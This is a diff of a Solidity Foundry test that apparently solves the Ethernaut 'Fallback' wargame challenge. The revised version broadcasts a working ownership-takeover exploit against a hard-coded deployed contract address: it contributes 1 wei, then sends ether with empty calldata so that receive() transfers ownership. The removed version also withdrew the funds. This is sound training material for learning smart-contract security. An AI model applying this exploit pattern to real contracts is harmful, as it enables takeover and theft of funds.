@@ -1,31 +1,21 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.13;
 
-import "../contracts/utils/TestWithSetup.sol";
-import "../contracts/1Fallback.sol";
+import "forge-std/Test.sol";
+import "contracts/1Fallback.sol";
 
-contract FallbackTest is TestWithSetup {
-    Fallback public contractToTest;
+contract FallbackAttackerTest is Test {
+    Fallback public targetContract = Fallback(payable(0x462cbc4e87A29724276986561AAe35D193da5156));
 
-    function setUp() public override {
-        TestWithSetup.setUp();
-        vm.prank(owner);
-        contractToTest = new Fallback();
-        vm.startPrank(user);
-    }
-
-    function testSolution() public {
-        assertEq(contractToTest.getContribution(), 0);
-        // sends initial contribute
-        contractToTest.contribute{value: 1 wei}();
-        assertEq(contractToTest.getContribution(), 1 wei);
-        assertEq(contractToTest.owner(), owner);
-        // payable(contractToTest).transfer(100 wei); //should work
-        // send transaction with empty calldata and ether value to invoke fallback function reveice()
-        address(contractToTest).call{value: 1 wei}("");
-        // prove ownership has transferred
-        assertEq(contractToTest.owner(), user);
-        // now that we are the owner, return recieved funds
-        contractToTest.withdraw();
+    function test() public {
+        vm.startBroadcast();
+        address startingOwner = targetContract.owner();
+        // challenge completetion
+        targetContract.contribute{value: 1 wei}();
+        (bool success,) = address(targetContract).call{value: 1 wei}("");
+        // check success
+        assertNotEq(startingOwner, targetContract.owner());
+        assertEq(targetContract.owner(), msg.sender);
+        vm.stopBroadcast();
     }
 }
